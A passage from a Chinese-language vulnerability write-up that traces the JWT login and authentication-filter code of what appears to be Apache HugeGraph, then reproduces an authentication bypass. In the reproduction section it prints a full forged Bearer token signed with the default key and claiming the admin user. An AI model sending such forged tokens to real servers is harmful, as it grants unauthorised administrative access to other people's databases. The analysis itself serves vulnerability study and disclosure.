<pre><code>public AuthManager authManager() {  
    return this.authenticator().authManager();  
}
</code></pre>
<p>可以发现没有我们需要的信息，并且返回一堆函数的调用，所以继续跟进到authenticator()</p>
<pre><code>private HugeAuthenticator authenticator() {  
    E.checkState(this.authenticator != null,  
                 &quot;Unconfigured authenticator, please config &quot; +  
                 &quot;auth.authenticator option in rest-server.properties&quot;);  
    return this.authenticator;  
}
</code></pre>
<p>该方法只是检查this.authenticator是否为空，如果为空就会抛出异常，不为空就重新返回authenticator。</p>
<p>所以跟进authManager().loginUser方法，在src/main/resources /StandardAuthManager.java中。</p>
<figure data-type="image" tabindex="1"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1740808474707-554ddd74-5136-4bb6-9b0e-bc54efe595ae.png" alt="" loading="lazy"></figure>
<pre><code>public String loginUser(String username, String password)  
        throws AuthenticationException {  
    HugeUser user = this.matchUser(username, password);  
    if (user == null) {  
        String msg = &quot;Incorrect username or password&quot;;  
        throw new AuthenticationException(msg);  
    }  
  
    Map&lt;String, ?&gt; payload = ImmutableMap.of(AuthConstant.TOKEN_USER_NAME,  
                                             username,  
                                             AuthConstant.TOKEN_USER_ID,  
                                             user.id.asString());  
    String token = this.tokenGenerator.create(payload, this.tokenExpire);  
  
    this.tokenCache.update(IdGenerator.of(token), username);  
    return token;  
}
</code></pre>
<p>这段代码可以发现构造JWT中需要的一部分参数，<em>AuthConstant.TOKEN_USER_NAME_以及_AuthConstant.TOKEN_USER_ID</em>，进入AuthConstant接口，可以发现这俩个参数就是_user_name_以及_user_id_，还有一个_tokenExpire_ 参数，不确定是有什么作用。</p>
<figure data-type="image" tabindex="2"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1740808491288-cb8656dd-c77e-4347-b5de-2b43272671c3.png" alt="" loading="lazy"></figure>
<p>继续跟进tokenGenerator.create，找到auth/TokenGenerator.java文件</p>
<figure data-type="image" tabindex="3"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1740808504146-4cb77ba0-2662-459c-bc62-b49519b1b881.png" alt="" loading="lazy"></figure>
<pre><code>public String create(Map&lt;String, ?&gt; payload, long expire) {  
    return Jwts.builder()  
               .setClaims(payload)  
               .setExpiration(new Date(System.currentTimeMillis() + expire))  
               .signWith(this.key, SignatureAlgorithm.HS256)  
               .compact();  
}
</code></pre>
<p>进而发现构造jwt的参数所需的全部条件。</p>
<h2 id="token构造分析">Token构造分析</h2>
<p>用于用户认证的代码主要位于_org/apache/hugegraph/api/filter/AuthenticationFilter.java_中的authenticate方法</p>
<pre><code>protected User authenticate(ContainerRequestContext context) {  
    GraphManager manager = this.managerProvider.get();  
    E.checkState(manager != null, &quot;Context GraphManager is absent&quot;);  
  
    if (!manager.requireAuthentication()) {  
        // Return anonymous user with an admin role if disable authentication  
        return User.ANONYMOUS;  
    }  
  
    // Get peer info  
    Request request = this.requestProvider.get();  
    String peer = null;  
    String path = null;  
    if (request != null) {  
        peer = request.getRemoteAddr() + &quot;:&quot; + request.getRemotePort();  
        path = request.getRequestURI();  
    }  
  
    // Check whiteIp  
    if (enabledWhiteIpCheck == null) {  
        String whiteIpStatus = this.configProvider.get().get(WHITE_IP_STATUS);  
        enabledWhiteIpCheck = Objects.equals(whiteIpStatus, STRING_ENABLE);  
    }  
  
    if (enabledWhiteIpCheck &amp;&amp; request != null) {  
        peer = request.getRemoteAddr() + &quot;:&quot; + request.getRemotePort();  
        path = request.getRequestURI();  
  
        String remoteIp = request.getRemoteAddr();  
        Set&lt;String&gt; whiteIpList = manager.authManager().listWhiteIPs();  
        boolean whiteIpEnabled = manager.authManager().getWhiteIpStatus();  
        if (!path.contains(STRING_WHITE_IP_LIST) &amp;&amp; whiteIpEnabled &amp;&amp;  
            !whiteIpList.contains(remoteIp)) {  
            throw new ForbiddenException(String.format(&quot;Remote ip '%s' is not permitted&quot;,  
                                                       remoteIp));  
        }  
    }  
  
    Map&lt;String, String&gt; credentials = new HashMap&lt;&gt;();  
    // Extract authentication credentials  
    String auth = context.getHeaderString(HttpHeaders.AUTHORIZATION);  
    if (auth == null) {  
        throw new NotAuthorizedException(&quot;Authentication credentials are required&quot;,  
                                         &quot;Missing authentication credentials&quot;);  
    }  
  
    if (auth.startsWith(BASIC_AUTH_PREFIX)) {  
        auth = auth.substring(BASIC_AUTH_PREFIX.length());  
        auth = new String(DatatypeConverter.parseBase64Binary(auth), Charsets.ASCII_CHARSET);  
        String[] values = auth.split(&quot;:&quot;);  
        if (values.length != 2) {  
            throw new BadRequestException(&quot;Invalid syntax for username and password&quot;);  
        }  
  
        final String username = values[0];  
        final String password = values[1];  
  
        if (StringUtils.isEmpty(username) || StringUtils.isEmpty(password)) {  
            throw new BadRequestException(&quot;Invalid syntax for username and password&quot;);  
        }  
  
        credentials.put(HugeAuthenticator.KEY_USERNAME, username);  
        credentials.put(HugeAuthenticator.KEY_PASSWORD, password);  
    } else if (auth.startsWith(BEARER_TOKEN_PREFIX)) {  
        String token = auth.substring(BEARER_TOKEN_PREFIX.length());  
        credentials.put(HugeAuthenticator.KEY_TOKEN, token);  
    } else {  
        throw new BadRequestException(&quot;Only HTTP Basic or Bearer authentication is supported&quot;);  
    }  
  
    credentials.put(HugeAuthenticator.KEY_ADDRESS, peer);  
    credentials.put(HugeAuthenticator.KEY_PATH, path);  
  
    // Validate the extracted credentials  
    try {  
        return manager.authenticate(credentials);  
    } catch (AuthenticationException e) {  
        throw new NotAuthorizedException(&quot;Authentication failed&quot;, e.getMessage());  
    }  
}
</code></pre>
<p>首先，是Http头的限制</p>
<pre><code>Map&lt;String, String&gt; credentials = new HashMap&lt;&gt;();  
// Extract authentication credentials  
String auth = context.getHeaderString(HttpHeaders.AUTHORIZATION);
if (auth == null) {  
    throw new NotAuthorizedException(&quot;Authentication credentials are required&quot;,  
                                     &quot;Missing authentication credentials&quot;);  
}
</code></pre>
<p>这里从AUTHORIZATION中拿出Token，限制了Http头要为AUTHORIZATION并且不为空。</p>
<p>然后开始判断token的开头</p>
<pre><code>if (auth.startsWith(BASIC_AUTH_PREFIX)) {  
    auth = auth.substring(BASIC_AUTH_PREFIX.length());  
    auth = new String(DatatypeConverter.parseBase64Binary(auth), Charsets.ASCII_CHARSET);  
    String[] values = auth.split(&quot;:&quot;);  
    if (values.length != 2) {  
        throw new BadRequestException(&quot;Invalid syntax for username and password&quot;);  
    }  
  
    final String username = values[0];  
    final String password = values[1];  
  
    if (StringUtils.isEmpty(username) || StringUtils.isEmpty(password)) {  
        throw new BadRequestException(&quot;Invalid syntax for username and password&quot;);  
    }  
  
    credentials.put(HugeAuthenticator.KEY_USERNAME, username);  
    credentials.put(HugeAuthenticator.KEY_PASSWORD, password);  
} else if (auth.startsWith(BEARER_TOKEN_PREFIX)) {  
    String token = auth.substring(BEARER_TOKEN_PREFIX.length());  
    credentials.put(HugeAuthenticator.KEY_TOKEN, token);  
} else {  
    throw new BadRequestException(&quot;Only HTTP Basic or Bearer authentication is supported&quot;);  
}
</code></pre>
<p>首先第一个if判断<code>Authorization</code> 头是否为<code>Basic</code>，如果为Basic就进行账号密码的原始字符串判断，所以开头不能为base。</p>
<p>第二种判断<code>Authorization</code> 头是否为<code>Bearer</code>，这种就是可以利用的JWT认证。</p>
<h2 id="漏洞复现">漏洞复现</h2>
<p>使用默认密匙构造jwt</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1740808527110-4f3b578f-6745-49a7-98eb-f77884974c36.png" alt="" loading="lazy"><br>
按分析构造token</p>
<pre><code>Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiJhZG1pbiIsImV4cCI6OTczOTUyNDU2N30.Kc_6-EtUz3J8lS9VZEfsEe4BFYz-GIg7SFFfGQ5VNeE
</code></pre>
<p>无token时,返回报错json<br>
<img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1740808540567-cac976cb-6e30-4106-9657-de99c4a4e857.png" alt="" loading="lazy"></p>
<p>加入构造token。</p>
<p>!<img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1740808553980-65fb539a-0745-4722-9fb3-67fd7e79f099.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
</feed>